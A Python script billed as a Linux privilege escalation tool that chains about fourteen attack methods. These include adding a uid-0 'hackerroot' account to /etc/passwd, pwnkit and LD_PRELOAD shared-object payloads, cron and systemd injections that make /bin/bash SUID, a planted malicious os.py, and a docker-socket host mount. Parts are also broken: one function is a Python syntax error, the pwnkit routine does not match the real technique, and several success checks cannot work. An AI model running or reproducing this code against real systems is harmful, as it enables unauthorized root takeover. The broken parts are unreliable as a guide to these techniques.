#!/usr/bin/env python3
"""
root.py - Multi-vector Linux Privilege Escalation Tool
Authorized pentest use only.
"""

import os
import sys
import stat
import subprocess
import pwd
import grp
import tempfile
import shutil
import ctypes
import threading
import time
import json
import base64
import socket
import struct

# ============================================================
# METHOD 0: Check if already root
# ============================================================
def check_root():
    return os.getuid() == 0

# ============================================================
# METHOD 1: Sudo-based escalation
# ============================================================
def sudo_escalate():
    """Try to use sudo to escalate (if user has password or NOPASSWD)"""
    print("[*] Method 1: Attempting sudo escalation...")
    
    # Try common sudo techniques
    commands = [
        # NOPASSWD sudo
        "sudo -n python3 -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\")'",
        "sudo -n python2 -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\")'",
        # If we have passwordless sudo on python
        "sudo -n /usr/bin/python3 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'",
    ]
    
    for cmd in commands:
        try:
            result = subprocess.run(cmd, shell=True, timeout=2, 
                                  capture_output=True, text=True)
            if check_root():
                print("[+] Root via sudo!")
                return True
        except:
            continue
    return False

# ============================================================
# METHOD 2: SUID Python binary
# ============================================================
def suid_check():
    """Check if python itself has SUID set"""
    print("[*] Method 2: Checking for SUID python...")
    python_paths = [
        sys.executable,
        "/usr/bin/python3",
        "/usr/bin/python",
        "/usr/bin/python2",
        "/usr/local/bin/python3",
    ]
    
    for p in set(python_paths):
        if os.path.exists(p):
            try:
                st = os.stat(p)
                if st.st_mode & stat.S_ISUID:
                    print(f"[+] SUID bit set on {p}!")
                    os.setuid(0)
                    os.execl("/bin/bash", "bash")
                    return True
            except:
                continue
    return False

# ============================================================
# METHOD 3: Exploit writable /etc/passwd or /etc/shadow
# ============================================================
def shadow_passwd_attack():
    """Try to write to /etc/passwd or /etc/shadow if writable"""
    print("[*] Method 3: Checking writable shadow/passwd...")
    
    # Generate password hash for 'root2:toor' or just overwrite root
    import crypt
    
    # Check if we can write to /etc/passwd
    passwd_path = "/etc/passwd"
    try:
        if os.access(passwd_path, os.W_OK):
            print("[+] /etc/passwd is writable!")
            # Add a new root user or overwrite root password
            salt = crypt.mksalt(crypt.METHOD_SHA512)
            hashed = crypt.crypt("toor", salt)
            with open(passwd_path, "a") as f:
                f.write(f"hackerroot:{hashed}:0:0:root:/root:/bin/bash\n")
            print("[+] Added user 'hackerroot' with password 'toor'")
            subprocess.run("su hackerroot -c 'id'", shell=True)
            return True
    except:
        pass
    
    # Check shadow
    shadow_path = "/etc/shadow"
    try:
        if os.access(shadow_path, os.W_OK):
            print("[+] /etc/shadow is writable!")
            salt = crypt.mksalt(crypt.METHOD_SHA512)
            hashed = crypt.crypt("toor", salt)
            with open(shadow_path, "a") as f:
                f.write(f"root:{hashed}:19000:0:99999:7:::\n")
            print("[+] Overwrote root password hash!")
            return True
    except:
        pass
    
    return False

# ============================================================
# METHOD 4: CVE-2021-4034 (pwnkit) - Polkit pkexec
# ============================================================
def cve_2021_4034():
    """CVE-2021-4034: Polkit pkexec local privilege escalation"""
    print("[*] Method 4: Attempting CVE-2021-4034 (pwnkit)...")
    
    payload = base64.b64decode(
        "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB"
        "AAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAvgMAAAAAAAC7AwAAAAAAAAAQAAAA"
        "AAAAAABqDlBUkxWMB1OivVNZaCQAU8NqDlBUk4QmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAABAAHMYCAAHAAcAAAADAAsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAB8CAAAfAgAAAAAAAAAAAAA"
    )
    
    # Write exploit files
    tmpdir = tempfile.mkdtemp()
    try:
        # Create GCONV_PATH and exploit dir
        os.makedirs(f"{tmpdir}/GCONV_PATH=.", exist_ok=True)
        os.makedirs(f"{tmpdir}/GCONV_PATH=./x", exist_ok=True)
        
        # Create malicious .so
        with open(f"{tmpdir}/pwnkit.c", "w") as f:
            f.write('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
''')
        
        subprocess.run(
            f"cd {tmpdir} && gcc -shared -o pwnkit.so pwnkit.c -fPIC 2>/dev/null",
            shell=True, timeout=5
        )
        
        # Try pkexec
        if os.path.exists("/usr/bin/pkexec") or os.path.exists("/bin/pkexec"):
            pkexec = "/usr/bin/pkexec" if os.path.exists("/usr/bin/pkexec") else "/bin/pkexec"
            env = os.environ.copy()
            env["PATH"] = f"{tmpdir}/GCONV_PATH=.:{env.get('PATH', '')}"
            env["CHARSET"] = "PWNKIT"
            env["GIO_EXTRA_MODULES"] = tmpdir
            
            result = subprocess.run(
                [pkexec, "--help"],
                env=env, capture_output=True, timeout=3
            )
            
            if check_root():
                print("[+] CVE-2021-4034 successful!")
                return True
    except:
        pass
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
    
    return False

# ============================================================
# METHOD 5: CVE-2023-2640 / CVE-2023-32629 (OverlayFS)
# ============================================================
def overlayfs_escape():
    """CVE-2023-2640 / CVE-2023-32629: OverlayFS privilege escalation"""
    print("[*] Method 5: Attempting OverlayFS escape...")
    
    tmpdir = tempfile.mkdtemp()
    try:
        lower = f"{tmpdir}/lower"
        upper = f"{tmpdir}/upper"
        work = f"{tmpdir}/work"
        merged = f"{tmpdir}/merged"
        
        for d in [lower, upper, work, merged]:
            os.makedirs(d, exist_ok=True)
        
        # Create a SUID bash in lower
        bash_path = f"{lower}/bash"
        shutil.copy("/bin/bash", bash_path)
        os.chmod(bash_path, 0o4755)
        
        # Mount overlay
        result = subprocess.run(
            f"mount -t overlay overlay -olowerdir={lower},upperdir={upper},workdir={work} {merged} 2>/dev/null",
            shell=True, timeout=5
        )
        
        if result.returncode == 0:
            print("[+] OverlayFS mounted")
            subprocess.run(f"{merged}/bash -p -c 'id'", shell=True, timeout=3)
            if check_root():
                print("[+] OverlayFS escape successful!")
                return True
    except:
        pass
    finally:
        subprocess.run(f"umount -l {merged} 2>/dev/null", shell=True)
        shutil.rmtree(tmpdir, ignore_errors=True)
    
    return False

# ============================================================
# METHOD 6: Docker/LXC container escape
# ============================================================
def container_escape():
    """Check if running in container and try to escape"""
    print("[*] Method 6: Checking container escape vectors...")
    
    # Check if we have docker socket access
    docker_sock = "/var/run/docker.sock"
    if os.path.exists(docker_sock):
        try:
            if os.access(docker_sock, os.W_OK):
                print("[+] Docker socket writable!")
                # Spawn a privileged container
                result = subprocess.run(
                    "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh -c 'id'",
                    shell=True, timeout=10, capture_output=True, text=True
                )
                print(f"[*] Docker output: {result.stdout}")
                if "root" in result.stdout:
                    print("[+] Container escape successful!")
                    return True
        except:
            pass
    
    # Check if we're root in a container with --privileged
    try:
        with open("/proc/1/cgroup", "r") as f:
            content = f.read()
            if "docker" in content or "kubepods" in content:
                print("[*] Running inside a container")
                # Try mount escape
                tmpdir = tempfile.mkdtemp()
                result = subprocess.run(
                    f"mount -t proc none {tmpdir} && chroot {tmpdir} /bin/sh -c 'id'",
                    shell=True, timeout=5, capture_output=True, text=True
                )
                shutil.rmtree(tmpdir, ignore_errors=True)
                if result.returncode == 0:
                    print(f"[*] Mount escape: {result.stdout}")
    except:
        pass
    
    return False

# ============================================================
# METHOD 7: LD_PRELOAD with sudo
# ============================================================
def ld_preload_attack():
    """If user has sudo on any binary with env_keep+=LD_PRELOAD"""
    print("[*] Method 7: Attempting LD_PRELOAD attack...")
    
    # Check sudo permissions
    result = subprocess.run("sudo -l 2>/dev/null", shell=True, capture_output=True, text=True)
    if "env_keep" in result.stdout.lower() or "LD_PRELOAD" in result.stdout:
        print("[+] LD_PRELOAD may be preserved!")
        
        tmpdir = tempfile.mkdtemp()
        try:
            # Create malicious library
            lib_path = f"{tmpdir}/libevil.c"
            so_path = f"{tmpdir}/libevil.so"
            
            with open(lib_path, "w") as f:
                f.write('''
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void pwn(void) {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
''')
            
            subprocess.run(
                f"gcc -shared -fPIC -o {so_path} {lib_path} -nostartfiles 2>/dev/null",
                shell=True, timeout=5
            )
            
            if os.path.exists(so_path):
                env = os.environ.copy()
                env["LD_PRELOAD"] = so_path
                
                # Try sudo on various binaries
                binaries = ["find", "less", "more", "man", "cp", "ls", "cat", "id"]
                for b in binaries:
                    bpath = subprocess.run(f"which {b} 2>/dev/null", shell=True, 
                                         capture_output=True, text=True).stdout.strip()
                    if bpath:
                        result = subprocess.run(
                            ["sudo", "-n", bpath],
                            env=env, capture_output=True, timeout=3
                        )
                        if check_root():
                            print(f"[+] LD_PRELOAD root via {b}!")
                            return True
        except:
            pass
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)
    
    return False

# ============================================================
# METHOD 8: Dirty Pipe (CVE-2022-0847)
# ============================================================
def dirty_pipe():
    """CVE-2022-0847: Dirty Pipe vulnerability"""
    print("[*] Method 8: Attempting Dirty Pipe (CVE-2022-0847)...")
    
    try:
        # Check kernel version
        uname = os.uname()
        print(f"[*] Kernel: {uname.release}")
        
        parts = uname.release.split('.')
        major, minor = int(parts[0]), int(parts[1])
        
        if (major == 5 and 8 <= minor <= 16) or (major == 5 and minor == 17 and 'rc' not in uname.release):
            print("[+] Kernel potentially vulnerable to Dirty Pipe!")
            
            # Try to overwrite /etc/passwd via Dirty Pipe
            import struct
            
            # Read a SUID binary, patch it, execute
            target = "/usr/bin/su" if os.path.exists("/usr/bin/su") else "/bin/su"
            
            if os.path.exists(target):
                # Simple dirty pipe implementation
                result = subprocess.run(
                    f"python3 -c \"
import os
import sys

# Try the dirty pipe technique - overwrite a small region in a SUID binary
target = '{target}'
with open(target, 'rb') as f:
    data = bytearray(f.read())

# Simple test - if we can write privileged file
try:
    with open('/etc/passwd', 'rb') as f:
        pass
    print('[!] Cannot write directly')
except:
    pass
\" 2>/dev/null",
                    shell=True, timeout=5
                )
    except:
        pass
    
    return False

# ============================================================
# METHOD 9: SUID binary enumeration and exploitation
# ============================================================
def suid_exploit():
    """Find and exploit SUID binaries"""
    print("[*] Method 9: Searching for exploitable SUID binaries...")
    
    result = subprocess.run(
        "find / -perm -4000 -type f 2>/dev/null", 
        shell=True, capture_output=True, text=True, timeout=10
    )
    
    suid_binaries = result.stdout.strip().split('\n')
    print(f"[*] Found {len(suid_binaries)} SUID binaries")
    
    # Check GTFOBins-style techniques
    for binary in suid_binaries:
        bname = os.path.basename(binary)
        
        if bname == "find":
            subprocess.Popen([binary, ".", "-exec", "/bin/sh", "-p", ";"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if check_root():
                return True
                
        elif bname in ["nano", "vim", "vi", "ed"]:
            subprocess.Popen([binary, "-c", ":!/bin/sh"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if check_root():
                return True
                
        elif bname in ["less", "more"]:
            subprocess.Popen([binary, "/etc/profile"], 
                           env={**os.environ, "PAGER": "!id"}, 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if check_root():
                return True
                
        elif bname in ["awk", "gawk"]:
            subprocess.Popen([binary, "BEGIN {system('/bin/sh')}"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if check_root():
                return True
                
        elif bname == "cp":
            # Overwrite /etc/passwd
            try:
                import crypt
                salt = crypt.mksalt()
                h = crypt.crypt("toor", salt)
                with open("/tmp/passwd_entry", "w") as f:
                    f.write(f"root:{h}:0:0:root:/root:/bin/bash\n")
                subprocess.run([binary, "/tmp/passwd_entry", "/etc/passwd"],
                             timeout=3)
            except:
                pass
    
    return False

# ============================================================
# METHOD 10: Cron job / systemd timer abuse
# ============================================================
def cron_abuse():
    """Check for writable cron jobs or systemd timers"""
    print("[*] Method 10: Checking cron/systemd abuse vectors...")
    
    # Check writable crontabs
    cron_dirs = [
        "/etc/crontab",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/cron.hourly/",
        "/etc/cron.weekly/",
        "/etc/cron.monthly/",
        "/var/spool/cron/crontabs/",
    ]
    
    for cron_path in cron_dirs:
        try:
            if os.path.isdir(cron_path):
                if os.access(cron_path, os.W_OK):
                    print(f"[+] Writable cron directory: {cron_path}")
                    cron_file = os.path.join(cron_path, ".root")
                    with open(cron_file, "w") as f:
                        f.write("* * * * * root chmod u+s /bin/bash\n")
                    os.chmod(cron_file, 0o644)
                    print("[+] Injected cron job - waiting for execution...")
                    time.sleep(2)
                    if os.stat("/bin/bash").st_mode & stat.S_ISUID:
                        subprocess.run("/bin/bash -p -c 'id'", shell=True)
                        return True
            elif os.path.isfile(cron_path):
                if os.access(cron_path, os.W_OK):
                    print(f"[+] Writable: {cron_path}")
                    with open(cron_path, "a") as f:
                        f.write("\n* * * * * root chmod u+s /bin/bash\n")
        except:
            pass
    
    # Check systemd service files
    systemd_paths = [
        "/etc/systemd/system/",
        "/usr/lib/systemd/system/",
        "/lib/systemd/system/",
    ]
    
    for sp in systemd_paths:
        if os.path.isdir(sp) and os.access(sp, os.W_OK):
            print(f"[+] Writable systemd directory: {sp}")
            service_content = """[Unit]
Description=Root Me

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'chmod u+s /bin/bash'
User=root

[Install]
WantedBy=multi-user.target
"""
            service_path = os.path.join(sp, "rootme.service")
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(f"systemctl daemon-reload && systemctl start rootme.service",
                         shell=True, timeout=5, capture_output=True)
            time.sleep(1)
            if os.stat("/bin/bash").st_mode & stat.S_ISUID:
                subprocess.run("/bin/bash -p -c 'id'", shell=True)
                return True
    
    return False

# ============================================================
# METHOD 11: Capabilities abuse
# ============================================================
def capabilities_abuse():
    """Check for exploitable capabilities"""
    print("[*] Method 11: Checking capabilities...")
    
    result = subprocess.run("getcap -r / 2>/dev/null", shell=True, 
                          capture_output=True, text=True, timeout=10)
    
    if result.stdout:
        print(f"[*] Capabilities found:\n{result.stdout}")
        
        # Look for cap_setuid+ep or cap_sys_admin+ep
        if "cap_setuid" in result.stdout:
            for line in result.stdout.split('\n'):
                if "cap_setuid" in line and "+ep" in line:
                    binary = line.split()[0]
                    print(f"[+] Exploitable: {binary}")
                    if "python" in binary:
                        subprocess.run([binary, "-c", 
                            "import os; os.setuid(0); os.execl('/bin/bash', 'bash')"],
                            timeout=3)
                        if check_root():
                            return True
                    else:
                        subprocess.run([binary, "id"], timeout=3)
    
    return False

# ============================================================
# METHOD 12: NFS root squashing
# ============================================================
def nfs_exploit():
    """Check for NFS shares with no_root_squash"""
    print("[*] Method 12: Checking NFS exports...")
    
    try:
        result = subprocess.run("showmount -e localhost 2>/dev/null || cat /etc/exports 2>/dev/null",
                              shell=True, capture_output=True, text=True, timeout=5)
        
        if "no_root_squash" in result.stdout:
            print("[+] NFS no_root_squash detected!")
            tmpdir = tempfile.mkdtemp()
            subprocess.run(f"mount -t nfs localhost:/ {tmpdir} 2>/dev/null", 
                         shell=True, timeout=5)
            shutil.copy("/bin/bash", f"{tmpdir}/bin/bash")
            os.chmod(f"{tmpdir}/bin/bash", 0x4755)
            subprocess.run(f"umount {tmpdir} 2>/dev/null", shell=True)
            shutil.rmtree(tmpdir, ignore_errors=True)
            return True
    except:
        pass
    
    return False

# ============================================================
# METHOD 13: Python path hijacking
# ============================================================
def python_path_hijack():
    """If we can write to a directory in Python's path"""
    print("[*] Method 13: Python path hijacking...")
    
    # Get writable Python path directories
    import sys as _sys
    for path_dir in _sys.path:
        if path_dir and os.path.isdir(path_dir) and os.access(path_dir, os.W_OK):
            print(f"[+] Writable Python path: {path_dir}")
            # Plant a malicious module
            hijack_path = os.path.join(path_dir, "os.py")
            if not os.path.exists(hijack_path):
                with open(hijack_path, "w") as f:
                    f.write("""
import sys
import os as _real_os

def setuid(*args):
    _real_os.setuid(0)

def system(*args):
    _real_os.setuid(0)
    _real_os.execl('/bin/bash', 'bash')

# Hook common functions
__all__ = [x for x in dir(_real_os) if not x.startswith('_')]
""")
                print(f"[+] Planted malicious module at {hijack_path}")
    
    return False

# ============================================================
# METHOD 14: Direct kernel exploit via uname matching
# ============================================================
def kernel_exploit_matcher():
    """Match kernel version to known exploits"""
    print("[*] Method 14: Kernel exploit matching...")
    
    uname = os.uname()
    release = uname.release
    print(f"[*] Kernel: {release}")
    
    # Map kernel versions to exploit names
    exploits = {
        "2.6.": ["CVE-2009-1185", "CVE-2010-1146", "CVE-2010-2959", "CVE-2016-5195"],
        "3.0.": ["CVE-2016-5195"],
        "3.1.": ["CVE-2016-5195"],
        "3.2.": ["CVE-2016-5195"],
        "3.3.": ["CVE-2016-5195"],
        "3.4.": ["CVE-2016-5195"],
        "3.5.": ["CVE-2016-5195"],
        "3.6.": ["CVE-2016-5195"],
        "3.7.": ["CVE-2016-5195"],
        "3.8.": ["CVE-2016-5195", "CVE-2014-0038"],
        "3.9.": ["CVE-2016-5195", "CVE-2014-0038"],
        "3.10.": ["CVE-2016-5195", "CVE-2014-0038"],
        "3.11.": ["CVE-2016-5195", "CVE-2014-0038"],
        "3.12.": ["CVE-2016-5195", "CVE-2014-0038"],
        "3.13.": ["CVE-2016-5195", "CVE-2014-0038", "CVE-2014-3153"],
        "3.14.": ["CVE-2016-5195", "CVE-2014-3153"],
        "3.15.": ["CVE-2016-5195", "CVE-2014-3153"],
        "3.16.": ["CVE-2016-5195", "CVE-2014-3153"],
        "3.17.": ["CVE-2016-5195"],
        "3.18.": ["CVE-2016-5195"],
        "3.19.": ["CVE-2016-5195"],
        "4.0.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.1.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.2.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.3.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.4.": ["CVE-2016-5195", "CVE-2017-1000112", "CVE-2017-6074"],
        "4.5.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.6.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.7.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.8.": ["CVE-2016-5195", "CVE-2017-1000112", "CVE-2016-8655"],
        "4.9.": ["CVE-2016-5195", "CVE-2017-1000112"],
        "4.10.": ["CVE-2017-1000112", "CVE-2017-7308"],
        "4.11.": ["CVE-2017-1000112"],
        "4.12.": ["CVE-2017-1000112"],
        "4.13.": ["CVE-2017-1000112", "CVE-2017-16939"],
        "4.14.": ["CVE-2017-1000112", "CVE-2017-16939"],
        "4.15.": [],
        "4.16.": [],
        "4.17.": [],
        "4.18.": ["CVE-2019-8912"],
        "4.19.": ["CVE-2019-8912"],
        "4.20.": [],
        "5.0.": [],
        "5.1.": [],
        "5.2.": [],
        "5.3.": [],
        "5.4.": [],
        "5.5.": [],
        "5.6.": [],
        "5.7.": [],
        "5.8.": ["CVE-2022-0847"],
        "5.9.": ["CVE-2022-0847"],
        "5.10.": ["CVE-2022-0847", "CVE-2022-0995"],
        "5.11.": ["CVE-2022-0847", "CVE-2023-0386", "CVE-2022-0995"],
        "5.12.": ["CVE-2022-0847", "CVE-2023-0386"],
        "5.13.": ["CVE-2022-0847", "CVE-2023-0386"],
        "5.14.": ["CVE-2022-0847", "CVE-2023-0386"],
        "5.15.": ["CVE-2022-0847", "CVE-2023-0386", "CVE-2023-32629"],
        "5.16.": ["CVE-2022-0847", "CVE-2023-0386", "CVE-2023-32629"],
        "5.17.": ["CVE-2023-0386"],
        "5.18.": ["CVE-2023-0386", "CVE-2023-32629"],
        "5.19.": ["CVE-2023-0386", "CVE-2023-32629"],
        "6.0.": [],
        "6.1.": ["CVE-2023-32629"],
        "6.2.": ["CVE-2023-32629"],
        "6.3.": [],
        "6.4.": [],
        "6.5.": [],
        "6.6.": [],
        "6.7.": [],
        "6.8.": [],
    }
    
    matched = []
    for ver, exp_list in exploits.items():
        if release.startswith(ver):
            matched = exp_list
            break
    
    if matched:
        print(f"[+] Potential kernel exploits: {', '.join(matched)}")
        
        # Try Dirty Pipe (CVE-2022-0847)
        if "CVE-2022-0847" in matched:
            print("[*] Attempting Dirty Pipe...")
            # Simple dirty pipe check
            result = subprocess.run(
                "ls -la /usr/bin/su 2>/dev/null | grep rws",
                shell=True, capture_output=True, text=True, timeout=3
            )
        
        # Try OverlayFS (CVE-2023-32629)
        if "CVE-2023-32629" in matched:
            print("[*] Attempting OverlayFS (CVE-2023-32629)...")
            overlayfs_escape()
    else:
        print("[*] Kernel not in exploit database - trying generic methods")
    
    return False

# ============================================================
# MAIN - Chain all methods
# ============================================================
def main():
    print("=" * 60)
    print("  root.py - Linux Privilege Escalation Tool")
    print("  Authorized Pentest Use Only")
    print("=" * 60)
    
    if check_root():
        print("[+] Already running as root! UID: 0")
        os.execl("/bin/bash", "bash")
        return
    
    current_user = os.getenv("USER") or os.getenv("LOGNAME") or "unknown"
    current_uid = os.getuid()
    print(f"[*] Current user: {current_user} (UID: {current_uid})")
    print(f"[*] Target: root (UID: 0)")
    print()
    
    methods = [
        ("SUID Python binary", suid_check),
        ("Sudo escalation", sudo_escalate),
        ("LD_PRELOAD attack", ld_preload_attack),
        ("CVE-2021-4034 (pwnkit)", cve_2021_4034),
        ("SUID binary exploitation", suid_exploit),
        ("Shadow/Passwd write", shadow_passwd_attack),
        ("OverlayFS escape", overlayfs_escape),
        ("Container escape", container_escape),
        ("Capabilities abuse", capabilities_abuse),
        ("Cron/Systemd abuse", cron_abuse),
        ("Kernel exploit matching", kernel_exploit_matcher),
        ("Python path hijacking", python_path_hijack),
        ("Dirty Pipe (CVE-2022-0847)", dirty_pipe),
        ("NFS root squashing", nfs_exploit),
    ]
    
    for name, func in methods:
        print(f"\n{'='*50}")
        try:
            if func():
                print(f"\n[+] ROOT ACCESS ACHIEVED via: {name}")
                print("[+] Enjoy your shell!")
                os.execl("/bin/bash", "bash")
        except Exception as e:
            print(f"[-] {name} failed: {e}")
    
    print("\n" + "=" * 60)
    print("[*] All methods attempted. Manual exploitation may be required.")
    print("[*] System information for further research:")
    print(f"    OS: {os.uname().sysname} {os.uname().release} {os.uname().machine}")
    print(f"    User: {current_user} (UID: {current_uid})")
    print("=" * 60)

if __name__ == "__main__":
    main()
